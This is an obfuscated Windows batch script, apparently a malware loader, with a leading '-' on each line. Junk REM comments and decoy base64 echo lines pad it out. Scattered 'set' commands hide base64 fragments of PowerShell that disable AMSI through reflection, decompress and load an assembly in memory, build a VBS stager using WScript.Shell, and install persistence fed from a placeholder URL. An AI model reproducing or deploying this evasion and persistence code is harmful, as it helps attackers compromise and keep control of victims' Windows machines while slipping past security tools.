-REM valley twilight vertex lance sword mirage cipher hawk
-REM shadow pixel sword
-echo VnRSQkFldkxOSUpzb1Ywb3MyQkhTTE9KWVk2a2RWWWxwQnZHTlptRHJGMHYxd2J5alBpMHRieUJjVUdEeTU0bnRCbHU5ekxx >nul 2>&1
-echo dzFFZlJONW81bnk1SE9vYUExU08xTVd1MWg2ZHZ2Z0YyaEFYQXg2MENmOUFLb1FxTUx4UmhnQnVKdzdKelpq >nul 2>&1
-se%XpjB%t "YYrLUT=ZXMoJFNvdXJjZSkKfSBlbHNlIHsKTG9nLVNpbGVudCAiSW52YWxpZCBzb3VyY2U6ICRTb3VyY2UiICJXaGl0ZSIgJHRydWUKcmV0dXJuCn0KJG1zID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtKCwkZGF0YSkK"
-REM ruby phantom glimmer
-sE%twHB%T "yivBEJrp=zQIyFeaXYUCJTnoEYsdUDhqivwgSn"
-REM sword fathom odyssey hawk glimmer fragment shadow pixel
-echo blptQ0hIRXYxdzNOQXRldVFuVnJVYUhTTjY4UG5HY0tHOGV5OWFEWXpNS0NzQmZI >nul 2>&1
-Se%umaTK%T "MLaOkuXyWRpkj=hlDwVIbCaxYicWSpq"
-echo TVNnTkRBc1g3VGpZYTJmRVlFcWFxcFB5UWdxc2xLMjUwbDU4MUZ4bXBNVTBKR2dTYnRpcVNhYjFobTJRbDZsSndzeHA3akdtU2dJ >nul 2>&1
-REM zenith kiln hawk binary fragment strobe zenith guard
-se%SDLw%T "bLtdvYggvxhyx=NwrBswicyHnAiPMFaLkQHclpeZQfgvVsYWv"
-SE%jut%t "EKeVzXokSdHIA=GTuuFsKNDIQkpOPpQPQqdnSkUrS"
-REM valley fathom kiln mirage echo lance
-echo Mk5JZEw2YXp6ZllCakNzUlFMYWE5U1AwVnQ5b0RGeGwwblJmRlc1UnI= >nul 2>&1
-sE%cnvH%T "zujMZJzcAIMoYI=DiNIvZOQbBjusLMntvPTxBIvWlF"
-se%tuF%t "pxMOEpMgIu=SVIxYgKtMIXXVHQRVsNqV"
-REM mirage lance phantom kappa
-se%EzY%t "kGdJpENWoMGyJg=tELQuNTKngQmsisL"
-se%vGYpu%T "dMwdimfcdHPBdxy=VgAeMAtqHkC"
-REM ruby vertex hawk ruby odyssey strobe hawk guard odyssey twilight
-echo cTF4S3hlVEN1TVN3dlBkZkRFOXgzQjFWMTlDOWtjWWJRdkJJcTF2QkpvUm11M2VFdzJkbkNXV2V2bGNqdEZYNUdIOTBK >nul 2>&1
-echo REdmck1ETzN3OWUwTngxbVZLekJpOUJGamN3ekhvdmo5VVFScXYyT09EdlQ3SUJrdGd6VnVuTjQ4SkpXVWJLT0gw >nul 2>&1
-REM mirage beacon zenith valley odyssey circle twilight
-Se%vCb%T "ZdMHoYxzdrCdSyL=SEMzyIMrzMgVsRSjaiAMsZOBUNPyY"
-REM lance undergrowth mirage shadow binary zenith glimmer twilight vision shadow
-REM lance cipher mirage clearing fragment
-REM valley guard ruby kiln odyssey fragment kappa cipher
-se%Rvdoj%t "auIddOInMbxYh=cYlpyUFgcOovdBthViebruCbSfJA"
-sE%bwa%t "QVxQOQJEI=XKLnkvhjPLwfkeMIXSpJH"
-echo N3RCdWM2bUlCWnVtaTVRUEVNUUhGeWxFZlBJUTVsZnlYME02THRtZnltbWRWTkV3M0Z6QWJkS1RuZlhRMEdsRFNtMnVtSlhkV1ZRNg== >nul 2>&1
-sE%rYR%t "tmkepcAjf=hGuPdzTOSHqOcQDnABLdLAIerdxbimZC"
-echo NUN0Nnc2OGViSUgydUtpNFJEWlZRQWVhZ2hqdTk5ODZoOUpzTmJ0elFheE5uUzI3bXBHVHBGaDNsWnMyZFVVdVE1S1dqT2FVY2lZU2RJ >nul 2>&1
-REM kiln delta lance hawk fathom glimmer
-SE%jggp%t "NuabJK=LjqiQbybGaIRIwbMSwlT"
-REM clearing odyssey glimmer echo fragment valley lance
-echo dUFjNk5iV0V4dnBPbTVTSzFyU25BUUdRY1BWUlhRYlJjVTVvSE1KYTduS0V6Y3ZLS0UwTFNnN3FiNmFpSEVMdHlrejJUTDlXMjB1ag== >nul 2>&1
-REM circle fragment sword glimmer vision vision twilight core undergrowth binary
-sE%dEjoi%T "akSfrG=pvtFkqVJQRogb"
-sE%DfV%t "aOAbbFSIJrh=yiITgSPdCWfgyUoZOaWYwBTZIlOuiibfr"
-REM core pixel twilight delta ruby shadow
-echo Q0UwSGVBYmhzUjk3Wkt3ZFdieXpIUHRkc21kQTlLb3hkZ3ZLUk1uSDY0UDE1MjNDUTkwSmt1Z3Ba >nul 2>&1
-REM odyssey shadow vertex clearing
-echo MTVzb09kQUNxakdUdDV1SktuVlJOU3NJcjVNVE9DUll1eDUxSnFRMThPbkZXek9DYzdvM0xEdGJOa3NFWGxFa0ZuaQ== >nul 2>&1
-REM beacon zenith mirage undergrowth clearing
-Se%RNgf%t "OsybKDFI=XJzdCAxCiRhc3NlbWJseVR5cGUgPSAkbXNjb3JsaWIuR2V0VHlwZSgnU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHknKQokbG9hZE1ldGhvZCA9ICRhc3NlbWJseVR5cGUuR2V0TWV0aG9kcyhbU3l"
-REM ruby cipher undergrowth undergrowth shadow circle kiln circle strobe
-SE%Vzp%T "QVeQVHbJWk=ADfoFsCnitb"
-REM binary kappa kiln glimmer
-REM zenith vision glimmer guard vertex binary
-REM sword mirage strobe sword pixel pixel phantom phantom
-echo aUFuTXZ3bU5EVW9MMnlpMFZtU2xoSXYydEtyUVdUVzB5NzFmeUVvckxFUWdnb3QwcnR2RlJWb21ySkxaRU1MSnFPNlFZYXFjaQ== >nul 2>&1
-echo dm9BbExLaTRXc0wxZFpWWjlCSDZJaTJ5cEdkTVhJZGlwN1RLbWJQYkVqNVpYMVFhWnFFazhpMA== >nul 2>&1
-Se%Yoz%t "PqYreYcooVVd=KIiMebEaiEvwhiFuWtabKQTeRdBFLzS"
-REM vertex odyssey strobe kiln beacon undergrowth vertex zenith guard circle
-se%TCOEA%T "JavydM=HZfjKtpksJxGj"
-se%xKBv%t "qFsqHZ=LUmaNiSePUqLSzdi"
-REM mirage guard zenith lance fathom twilight mirage kiln odyssey pixel
-REM cipher hawk zenith glimmer beacon kiln binary echo echo
-REM shadow twilight mirage phantom
-REM valley vertex lance fathom
-echo ZmVCaTV2R1Z5TGhMQjA3eXE2enFOZ1ZWUFJUM0FVYkZxY2ZBR1FHOHpYSWFOZzhGektka0xWMlg3Yg== >nul 2>&1
-se%OEL%T "LlvZFZQOaCdIYRd=CFIlniiGwXDeCMaE"
-sE%ADxv%T "aNsbKf=VRiAenfyXO"
-REM hawk ruby clearing
-sE%wmypn%T "GShjykGNjtB=0ZhaWxlZCcKJGFzID0gW1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgkYXQpCmlmICgkYXMpIHsKJGYgPSAkYXMuR2V0RmllbGQoJGFmLCAnTm9uUHVibGljLFN0YXRpYycpCmlmICgkZikgeyAkZi5TZXRWYWx1ZSgkbnVsb"
-SE%rkZ%t "STEHOE=mEhyJHrEwAzkufsWgYtrStyf"
-REM undergrowth undergrowth kiln sword fragment
-Se%uXXK%t "eppfQf=PhhJijLitAIiZZdcyDBlsehCgkuINAV"
-REM shadow strobe odyssey sword twilight cipher fathom
-REM beacon fathom mirage shadow lance strobe core
-REM valley vision odyssey odyssey shadow mirage circle hawk clearing
-SE%nTGK%T "FYuDbYeqgLiUEHV=qcQbvhmbvOUixLNV"
-se%LID%t "ykBoqfBj=nngcBsFHCJPUiUInLhuMnbKNVYWjNao"
-REM cipher twilight guard
-REM undergrowth kiln core delta fragment undergrowth valley
-sE%DtE%t "tLGTlo=nLMxzmsUNbZJtjC"
-SE%qTMKa%t "MAAxNz=JaedmYvYgKYgQCQ"
-se%nRjAB%t "qtDAXoD=b3IgJFBFUlNJU1RFTkNFX1VSTCAtZXEgIiIpIHsKTG9nLVNpbGVudCAiWyFdIFBlcnNpc3RlbmNlIHNraXBwZWQ6IFlvdSBoYXZlbid0IGVkaXRlZCB0aGUgVVJMIGluIHRoZSAucHMxIGZpbGU"
-se%tauTN%t "LIEaVJGuKb=EHkNtXlKlhmPnCRIGxAQEsACdfznxzuQCz"
-REM binary valley binary odyssey vision strobe ruby
-sE%MCo%T "QMtRZzShsl=sfycKDsjGgOpQewKwyhjeiQAlwvcp"
-REM ruby guard twilight core
-echo dWdTbmM1WlVYZ3VrQ1VaT3d4VDVJU1JTTnhYRjc5b2ZzSUprWldERnNER2xKampJSkxJZ290eVNHRENmd3B5c29DOFI5cDE4V2U= >nul 2>&1
-REM echo delta lance circle kiln fragment vision clearing odyssey
-REM kappa mirage beacon guard
-sE%zFxD%t "OXXrQiQcK=tFBnWIpAkPtezDAcTgSylOdQNMzr"
-REM guard ruby kiln odyssey valley fathom pixel zenith
-REM vertex cipher binary shadow sword vision
-se%aqZd%t "kkeBGGxDOvTsxYr=RYXtyqLarsMGaCyOP"
-REM beacon core beacon mirage cipher fathom undergrowth mirage guard binary
-echo djBKRWhsYTFVUzRBSWRHdUZMcGFpU2JTeVVGakdsV2FWYm95d1ZCTW96THhTQWhZQ01mRVF3dDk2OWZWbEtweWNJMTlteDhwRjJyYTRlNG4= >nul 2>&1
-sE%BOUK%T "QtwgNzJqyp=yqeRyFiYOzLgmxmPtnnfL"
-REM delta ruby fathom echo mirage pixel phantom shadow vertex
-echo RWw4aWlIbnExRW5CakpKQnU3UUtiSmt6N2k0RUxrNjREdEZKNzVMclVTdkw3Zk5TU0NQVTZUbQ== >nul 2>&1
-echo enA3VjZBdDFVbHJDN3dLdHRSbEFYWmE0dkdjeHFzY1NNM3FRYkN2WkcwQ1ZvTFVPMzFsdzFiRnpVT2xWc0kybWl4SFdHN21ZZXZHdkc5Ug== >nul 2>&1
-se%NWiQB%t "wJaKsAEdbHAr=IudHh0IgpMb2ctU2lsZW50ICJbKl0gQ2hlY2tpbmcgcGVyc2lzdGVuY2UgY29uZmlndXJhdGlvbi4uLiIgIkdyYXkiCmlmICgkUEVSU0lTVEVOQ0VfVVJMIC1tYXRjaCAiUkVQTEFDRV9XSVRIIiAt"
-Se%Sld%t "fTAFCAMREMu=yHiHyRDlfBbOeuOnRNWBcf"
-sE%vVaJF%t "cYQdKfaH=RlbmN5IHJlcXVlc3RlZDogJCgkZS5OYW1lKSIgIlllbGxvdyIKcmV0dXJuICRudWxsCn0KW1N5c3RlbS5BcHBEb21haW5dOjpDdXJyZW50RG9tYWluLmFkZF9Bc3NlbWJseVJlc29sdmUoJG9u"
-SE%rRC%t "ZTdhQc=MztHMEbeyRbJPznuNnbNlmxiDo"
-echo TDIxVjNxdHRJUGtOeVdRWXBtcmRWY29qWFZzRmNaQUVTQktwUDZ5NE52WlJZbEhpVTZBeUx5OHV2NFhxUHk0YU1o >nul 2>&1
-sE%xOz%T "DQAKlxCt=HZic0NvbnRlbnQgPSBAIgpEaW0gc2hlbGwsIGZzbywgdGVtcEZpbGUKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKU2V0IGZzbyA9IENyZWF0ZU9iamVjdCgiU2N"
-echo WDNUa0U1ZXo0dEZBZkxSbTlpTUdnR1JRRnpNaVU3YUMyenRqeFBGTw== >nul 2>&1
-REM guard vision shadow zenith
-REM phantom kappa vision
-sE%wwo%t "pbhbMKOyN=9tcHJlc3Npb24uR1ppcFN0cmVhbSgkY21zLCBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpCiRvdXRNcyA9IE5ldy1PYmplY3QgU3lzdGVtLklPLk1lbW9yeVN0cmVhbQokZ"
-se%NWz%T "wYJEXynz=rXPfxyNJyKQofYOSPv"
-Se%zfdDr%t "QQeSULOXnBl=ijreMnoGgTTTPdzLIzpcpPQklSXkKRJeZfP"
-REM lance odyssey core kiln valley delta core mirage hawk
-REM circle clearing vertex strobe
-echo S2JTSTFiNGg5QTBwVndLekVTWmZHbWV5anVCcU1lOHFJQjFjaW1sOTBQeVlGcHB5SUJFSkFrSjhlcEtvdWh0bWQzeFY= >nul 2>&1
-echo c1dVOEphUmtRS2FCUWRHMmRVR1pJUG9rV2NBZ0pGTW9PWHVPVWV2ZXR6eXJwUUNVVWk= >nul 2>&1
-REM phantom twilight circle echo fathom vision delta
-REM binary strobe undergrowth
-REM circle kappa glimmer core valley twilight lance twilight hawk
-REM twilight fragment binary phantom valley fragment twilight vision binary twilight
-REM lance echo fathom
-se%qjtoj%T "PpNqBphQ=RtLtMeNbBfBmGRwaBHsbCLJRpoTZp"
-se%kuQx%t "lybmSwTFZ=ZnVuY3Rpb24gRGlzYWJsZS1BTVNJIHsKdHJ5IHsKJGF0ID0gJ1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uQScgKyAnbXNpJyArICdVdGlscycKJGFmID0gJ2Ftc2knICsgJ0luaXQnICsgJ"
-REM phantom sword fragment vision clearing fathom mirage
-echo WVEzRWJMVHBVdGZCV0hmaFhEWXd2RjdBelhtN2dOVDJoWXp4ZTN3d0RST0s5cHJzMFdyVmdQcGhBcEd3dHhnam1JSmtCajdtWk5UMVlqZw== >nul 2>&1
-echo SlpBOXVId2FCOENPeXpQTnVVYldWUDRtUjNmOWp5WkhRdWFTWEJkNXQ0VkJhV1B4SGNvUGxxbDN0Y2FPc1NXaU1BTzBUMHVNd3NoRGs= >nul 2>&1
-REM kiln delta vertex beacon beacon kiln undergrowth kappa delta
-REM strobe core undergrowth sword fathom sword zenith odyssey fathom pixel
-Se%BWk%T "OWUvaeUv=NUWsnGBOmjhaAdBQErPQX"
-REM phantom lance sword fragment guard fragment ruby shadow guard
-REM zenith strobe fragment kiln phantom core ruby ruby kappa delta
-REM fragment vertex pixel
-REM glimmer zenith clearing core sword twilight
-SE%rjK%t "PPNyaLbtgAac=attikTfYgiSYHgtidJPTSXSiE"
-Se%Qokg%T "CcqJaL=EUpKQpMb2ctU2lsZW50ICJbK10gQXNzZW1ibHkgTG9hZGVkOiAkKCRsb2FkZWQuRnVsbE5hbWUpIiAiR3JlZW4iCiRlbnRyeSA9ICRsb2FkZWQuRW50cnlQb2ludAppZiAoJGVudHJ5KSB7Ckx"
-Se%heUrl%T "IXWnoHG=SQvtgaDrkctmuHtPLbkDbDRpYIDjxq"
-se%bza%t "ejjFvpLkAzGFie=NwJZPsvJyXvWwVKJZJMr"
-REM vertex circle odyssey
-se%jkk%t "LayhNobh=YvLKVjJzeg"
-REM circle odyssey kappa zenith valley binary odyssey zenith
-REM fathom fragment core circle
-echo Nnk2YkxPenRsUTNkM2VaMnY0dHZYVGRoT3A1ekVmcFI5ZGIwaEEzYkxaVUN2a3VwdlhoaXU3bFZJVE9wQ2Z0MG1P >nul 2>&1
-echo MDFEV1NxbVFTaVhrd2pUc2xuSjk0SktFME5FaWRrWEc5S2lDVUNlekpUZUVjWVg5dkFI >nul 2>&1
-sE%Udz%T "dYEWKY=oUFYolZsUkDLAOiolBuZvQOdGtZsKJ"
-echo YmdjVkRsc05QUnBnT1JJWU4yTFhzRXRqV3RJOHo3aUJzRHNTaHpIOUgwRHpsdlpDMEp4dTZjeGNzVDRBTU9HVHlvNkt1MGtlTUs3 >nul 2>&1
-REM cipher core echo strobe
-se%WrEjP%t "XGwlIobf=QPBYwfwCSICVTRWdykAYlmyfGjh"
-REM delta hawk kiln guard ruby hawk
-se%oEKTX%t "jJKiLad=NnChoRxWsOMXdRRkxAcN"
-se%emR%T "MPmTCEsAgJjD=VhWbopNYtmoXJaDziu"
-SE%watII%T "MGHAGKrjeHpRf=xZMZOcWNiBZfWwjMQQhruNpVThRmjYfUJ"
-REM guard glimmer glimmer odyssey kappa
-se%tIAC%t "jMhnVTe=chbZLCWLefdiEDptrJHRcpKJ"
-echo Q1hPdkpPT3piV2lFdTJiNWZ5eElZWmJvbXV2RWdjYWRuMldrMjlGNzNyN1Z4UlllMms= >nul 2>&1
-REM lance vertex shadow
-se%GQHZ%t "VWijagrow=akdvNMiEacnNmXqjqbA"
-Se%xRuHe%t "CTqYnbrDwEh=NEoQRJgrCiIYp"
-se%eWPV%t "NJIJspPVcfvzd=TCVWXUNtedPBiTuRWdFmPDnKYXrYRZv"
-REM core vertex mirage glimmer binary undergrowth
-Se%dnmhq%t "MyssPtnfqWa=eAztwAlZEVDDeUsYjEDKhGtGOMPPaRpfBj"
-echo SGJtdXk0R1ZuaElaZHYwTHlzS29MaHF1UVh1anlPb2cyd2pUR3ppRXIzWVJaMUdiUDNCVTNU >nul 2>&1
-REM lance hawk strobe sword delta zenith undergrowth
-se%MFIXs%T "ZGEIIKhEShEgVqp=CRLTmlaoHqFWYScbpGTvyBMktmoY"
-Se%PmFs%t "bmkRctFgZ=gPqXhLKEurd"
-sE%ZFBD%T "LrlBQRrbZScpJ=ZbZrzlEgybCRFvtmMFCBRwpeKGbcEia"
-echo UExVMVZLQWV5aWhsRk0yUU01QkZKMHphWlNZVzR4c3FRcHM0UGJxR29EUkczdTJZUnZ5S3JnVlBYYmY= >nul 2>&1
-REM odyssey sword circle core guard valley
-Se%ZHg%t "ZAQEEk=rLMyNTjMYQEpYPhrRiLzYjKKvIcjVWSrl"
-REM valley mirage kiln zenith sword kappa fathom
-REM pixel undergrowth phantom guard kappa fragment odyssey mirage delta
-REM twilight phantom lance fathom pixel guard phantom
-echo OENxN0xlaFEzNjAyaXhDTzJwWjg4Y0J6VEhORXM3d3J0eTF2MGdkWTNVcjY5WEZQVzBJQUtTczZtY25MN3pSMFk1S1F4VQ== >nul 2>&1
-echo cW5qdVYwQ0R2RHhvT0FLNmEwU0dreE1hWGtQclJsVGU4S1kzNlB1MjlQY3BZdkQ= >nul 2>&1
-REM sword odyssey phantom shadow hawk guard pixel kiln undergrowth
-sE%TVvX%T "CtUEsBUKRtgpqK=YbztWdGaoglRvyUMBXoFmCdye"
-REM vertex beacon binary hawk core kappa hawk echo phantom delta
-REM core ruby core guard
-REM phantom fragment shadow
-SE%LdYDL%T "qpedsO=PFPhABXgyOFynxAU"
-REM kiln fragment lance echo
-sE%tclIU%T "gkfdtAMNkJoqR=IgcNhxxXzJSO"
-sE%UkF%t "kBiheomXTkTV=UKUCbDsRlkScELqhDWpFlbEnlmbyz"
-REM valley odyssey strobe twilight
-SE%uWLC%t "iyAXiKqcwoeCvE=PJbyxNyXnzKaqEtVyBMY"
-se%sAa%t "knTdKGj=SEGFdKCnMpYxAJhSNcrE"
-REM lance shadow valley
-Se%STnj%T "kGrJVEkvhzVEb=CnbuWeZocaKfAkwejOiBwPbbxhYCyAGoRuD"
-SE%Zls%t "ZdXDklQSMaz=lsFeqSvXIclmVQowXuXuxjsueN"
-REM core echo core twilight fathom pixel clearing
-SE%LLK%t "QGrnJaaYan=FNuiRntRyZoaAzuHshBxDaS"
-REM clearing lance undergrowth
-echo NFVtVDBScDJzd3pCd1M3dFFITm1RNjhHc2Z4WmpjYllVQjBXcmR5RzFScQ== >nul 2>&1
-REM kappa vertex cipher circle mirage
-Se%btVQR%T "YGEqFFg=jmIgyUEVsbtVLWRSHHaFsf"
-sE%mHbh%t "wPVZUeOCZr=oGNssYIAwKA"
-REM twilight pixel beacon phantom fragment fathom fragment undergrowth
-se%lLC%T "DIfvqoEkPjMGPEJ=VLkaDHwmkRw"
-se%CQKI%T "cRHJavUJL=hKvHuvlBDkfFLOLzJYOSIJvFphoPpkXpHk"
-REM kappa guard echo lance beacon guard
-REM mirage fathom zenith vision phantom kiln pixel clearing
-se%lXrT%T "YRUeXiW=uUdnUFJlpSimZcuCuw"
-REM core strobe ruby binary shadow vision kappa echo
-echo SXRQUFFvR3RjUHV5bEREaFRqMjBoNktuSVlYOHZlWWs2WjhuaE5ubUxVejBvR2FKU3FkQlp1 >nul 2>&1
-REM hawk vision cipher
-sE%Drz%T "zqgHODXzIZG=KnUFyVSTYB"
-REM binary vertex hawk core circle
-REM twilight phantom vertex twilight cipher
-SE%pHwPJ%t "BPAgMjELCBo=b2ctU2lsZW50ICJbKl0gRW5jb2Rpbmcgc3RhZ2VyIFVSTCBmb3IgVkJTLi4uIiAiR3JheSIKJGNockFycmF5ID0gKCRTdGFnZXJVcmwuVG9DaGFyQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHsgW2ludF0kXyB9KSAtam9pbiAiLCIKJ"
-REM pixel vision fragment phantom core ruby fragment
-echo cEFyb1B2Z3JGa1ZkRHJBZU85a0U2VG55bHdCanpFelRNczRwWVladDA3RTk3V1M4eFpDckUyZnBXUmxFRG5TZ2VnelNvY1ptWWk= >nul 2>&1
-Se%wAxu%T "YwhYaRPb=ySmRuaZXXiaYJklUnfGMwZbOdR"
-REM odyssey kiln ruby
-REM mirage twilight vision zenith circle fathom mirage
-SE%nGbzi%T "fTPcfQFxgyWNT=VmwskBTLokTWyYdEozjX"
-echo NlJSVEN6eVhEamNEdVJFUnliU1hUUlowSlZmR3Z3YUxmWVpYQjhOTA== >nul 2>&1
-SE%LBWa%T "dffAWRJYsLGLchq=zBHrDDwXEjcExg"
-sE%UiCkM%t "EAiEoy=BFfGIFxrcJ"
-SE%duTeL%t "rxzKkywL=cfuZWZIPaKpccjjsbX"
-REM guard lance odyssey glimmer kiln cipher lance circle glimmer vision
-SE%IIZ%t "TdwmslqsbUc=JTSVNURU5DRV9VUkwKfQpBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nCiRvblJlc29sdmUgPSBbU3lzdGVtLlJlc29sdmVFdmVudEhhbmRsZXJdewpwYXJhbSgkcywgJGUpCkxvZy1TaWxlbnQgIlshXSBEZXBlbm"
-REM vertex ruby vision odyssey kiln odyssey cipher phantom circle
-REM odyssey core ruby glimmer lance echo echo fathom vision phantom
-Se%PCe%T "slQkltCoTGw=fEKcNAvlVFpHOhCftZwBlJkXBcD"
-sE%pJp%t "RHxUOlWRmmPF=PEVnrdBZpoIHsZLsTgergMSTKceirgXOfR"
-REM glimmer fathom odyssey
-sE%LWQO%T "DGcZFcgrYLlTR=vJbzSKRWebPdoz"
-Se%Ijw%t "jytywGa=UjqGEFMtbveKDyHYpOgNRbtCJVGGHT"
-REM zenith strobe kappa delta ruby kiln clearing
-REM glimmer valley mirage core zenith ruby
-Se%ywAgh%T "npBbuJfiu=WAqPICxhsZGqkwV"
-echo ZlhvQUVEbmpoenRKd042d1FmOVVMbUZjZXdrbHh1SEJSSDUyOW1MbmNDUVlpWg== >nul 2>&1
-echo SG13T0VuTHUxMks3S3JPRm1XZlg2dWNZdlZ2WmRlZnNxbXljOE5aaGZ1cjhi >nul 2>&1
-se%xdh%t "jIWfqQNzL=Rkb25lID0gJGZhbHNlCmZvciAoJHkgPSAwOyAkeSAtbHQgJGg7ICR5KyspIHsKZm9yICgkeCA9IDA7ICR4IC1sdCAkdzsgJHgrKykgewppZiAoJHkgLWVxIDAgLWFuZCAoJHggLWVxIDAgLW9yICR"
-SE%DubU%T "NuGGjVkr=DKMwvVkkNxAyiAtHjdOmdgYRYk"
-se%TucL%t "IPQwlSQKOxnM=fTZwTxUPARHXFdQtghfrDe"
-REM sword phantom undergrowth vision
-REM valley fragment ruby delta vertex pixel clearing
-se%jzX%T "AWSHBZcJcnevSpq=wLqyXCdvHnZr"
-SE%vcO%t "fNujGnRGv=TnadGfzbPTqRENORUXLXposljjyNQMa"
-sE%kHVlf%T "iQSNKnjhWYRRK=BtPcjRHBAovQWYxtBtLvdBFWIMAAug"
-REM phantom core kappa beacon ruby vision binary fathom
-sE%jxOR%t "ClFTbZGpujJi=IKaWYgKFRlc3QtUGF0aCAkdmJzUGF0aCkgewpMb2ctU2lsZW50ICJbKl0gUGVyc2lzdGVuY2UgYWxyZWFkeSBpbnN0YWxsZWQuIFNraXBwaW5nIHdyaXRlLiIgIkdyZWVuIgpyZXR1cm4KfQpM"
-echo ZGZhZWhzaW1QOFA5bmw0WTR6Q093b1R2enJnR1JXWGVFMXpnQjhMSWM5cmM3MWJISmNBR29GTndoYXZScW92UTNROURPeDdvRlU= >nul 2>&1
-SE%glB%t "RIVnqJ=OGWuqHDnYzDa"
-REM cipher circle mirage strobe guard shadow cipher fragment
-REM echo clearing odyssey zenith pixel
-sE%GOFV%t "LbiOiTBqhtO=eXixKvQxZOXueONIDDxs"
-echo MlpTa002M09ndWZHenE4cW9JUE9nWVJqOExqcXhuSmI5QUxWdkRCTFhZcFN0QVFySFZCQ29PNEhyT1FFNk5USXVBSk1ZdnZsWk0wQQ== >nul 2>&1
-echo U3VNQ25xWWNxVGJwd1ZXOVJzZ0VIc2pyUzhBRXR6NTI2SlZFM0d3ekd2Rlh3a3ZvSVBRdmljWXh4emxVMzhGazNGc013dzBVNU9zU2RaZU0= >nul 2>&1
-REM kappa pixel guard echo
-Se%hMOyz%t "XsRQdEVqo=cYFVWScJHbZolziKxukGUWIGJNCESUNjnTc"
-sE%Bvt%t "cIsqhxOqcUshVf=KPVQwIFJHCMTerovyzwaejVc"
-echo ZVlNbUU0MWFGMTZNWFk5dW1VbzdlM1VWcDdBTG5meTUzOFRNNGhwM1pTVEE0a05HMzB2aGJKZTZpSktNU1hnbzRCeGg1bTBj >nul 2>&1
-se%QsgB%t "eXMqMZYpANu=vc2UoKTsgJG1zLkRpc3Bvc2UoKQpMb2ctU2lsZW50ICJbKl0gRGVjb21wcmVzc2luZy4uLiIKJGNtcyA9IE5ldy1PYmplY3QgU3lzdGVtLklPLk1lbW9yeVN0cmVhbSgsJHBhY2tlZCkKJGdzID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uQ2"
-REM strobe odyssey odyssey
-echo djRhWHI1dXJMOUhXNzEwQnVkN3BOcnZXaWxDUzhudkhtOHRvNjBaRjdxblVIRXhYeTBsSm1HTA== >nul 2>&1
-REM clearing kappa shadow shadow hawk beacon hawk sword
-se%Ilq%t "vOaTDGTpU=FbaplcQRvdykPBRGYnsMsciiT"
-se%kJATO%t "jcDMWvuSXQ=MNdvuusRwKspsBRKEAipCwWtd"
-sE%uCZeA%t "CFrHWOsWgJHqQ=AzpBxrYckCGgepwRixlcGwSaHY"
-REM kappa phantom zenith phantom vision cipher delta undergrowth vertex
-REM valley core ruby cipher phantom clearing fragment
-SE%IGYG%t "VnSgMkfcykURDA=VbzdsUZDpSuoKhSgXFK"
-SE%BzdE%t "qKahvyIrgPxtSk=QUXkUIQHoGxnotqwkysCkBPYmIrn"
-REM valley circle valley ruby sword
-REM valley core phantom lance fragment mirage fathom sword phantom
-se%AYYZ%T "fmsRtPtwlWZaR=zbmXGsPzhnqmnfpHwWplCXdk"
-echo bVhQaUxGUkh4bEFYbURIVTU2ZjZIMHA2TnFIV2FNU2FWUXZib0d5aFBCekNId3BnWEh4aXNDQWMzVGJVYUZ6MDJnNzd1QUYzd1dybA== >nul 2>&1
-SE%NdSvK%t "KuRHfF=ZdquTuHgeMlYJnACOGYBWOHzScWnD"
-echo Z01XMzNTZXU3TVkwN1dMRWhSeUJiOEpPNzhjZDdkOXdzVjBDa3M2UXlNczZ0TFZGV1N3b0ZEVWRROEFW >nul 2>&1
-sE%SyE%T "QPZYGmUFQ=INwHDvBQZserfmflVjBYPbiwcYgm"
-echo VUFTOGdqTGJkWDB1YTVVYXRZVHpuSUR3Z0M0OFd1dFJFcHJFRWJtY2hPbkhXbFpqZA== >nul 2>&1
-REM pixel core sword fragment sword fragment sword cipher
-echo bG9QeUdidEszeFI5eE00aERDNVJsYVVoV2dlcGdnaXRUbUFoUTR5NGJxUWw1dlVZTnpoQUdmN29veFF1aHVkcXZQRmpKZGg4cU1wc0VjZFA= >nul 2>&1
-REM fragment odyssey kiln circle odyssey
-se%DDmLT%T "LXmjBDPFZtxdv=nvFzSUDIfPx"
-REM ruby vertex phantom hawk clearing kappa phantom undergrowth clearing strobe
-REM fathom mirage glimmer vertex kappa kiln
-sE%RdlUr%T "CYMzigSdtaROFe=gihHGPHdaQnKooOkp"
-REM zenith beacon clearing zenith echo phantom kiln core
-echo N0NMRXd3bmxFdUhsUDFqZVVJME9PZVN4cDFCTDZqVmpvWXU4cmF1QjhoQVdJYUlrblFVNFBYWnRhVFdOY0lCZA== >nul 2>&1
-sE%gAI%T "ZKpyfyvb=tGctDlbYssb"
-SE%NmGW%t "IDyhkDsynpN=YytFHkxLhQCJcl"
-echo YXN4YllKSTM0Y2J4Yzh1NzlhcXVOcmIzQ0czV20wd3lyZWFWRjFKbWNQVU5qSldYVmNCS0I4 >nul 2>&1
-echo NnliSU1weFhXcWRCQjhObjkzSTk1bzQwQ01jS24zSnJ0RlB1S2lObjVscDYyZVNiZ2xiTXQ4eTFUWQ== >nul 2>&1
-SE%lFuxa%t "DwyNmXDHy=PPoBodywRgmpiZQDMQyJUFY"
-REM clearing circle phantom shadow circle core
-REM fragment glimmer glimmer core ruby circle mirage circle phantom clearing
-REM odyssey glimmer vision
-Se%acDrA%T "DNkvyAjx=OKekOFSHYJARfXaZqUbRcwVGdjzAPG"
-echo NVRmRGwxNkpZNER4bFlyenlKVXRnSGk3MGdXdkhkYzlxZ1pNQ2wwNA== >nul 2>&1
-Se%Besp%T "YUDwPfy=vQZPiYEvWGxh"
-se%XDdk%T "ifDXAdt=wIrueeMEHTbtMBgUGOqkoOyYrTTMocHflN"
-sE%cdd%T "JewtwpBTSFqoWdu=rfeKUkMstEBkSytfhYcVzWpJ"
-echo emFUem1VcDhReFdiYjc1dlA5ZVVSbG5URENTd21DbFVacm9EbTl6WUpJZFRDVQ== >nul 2>&1
-REM ruby odyssey vertex beacon sword echo vision vision kiln
-REM strobe delta echo cipher circle sword lance
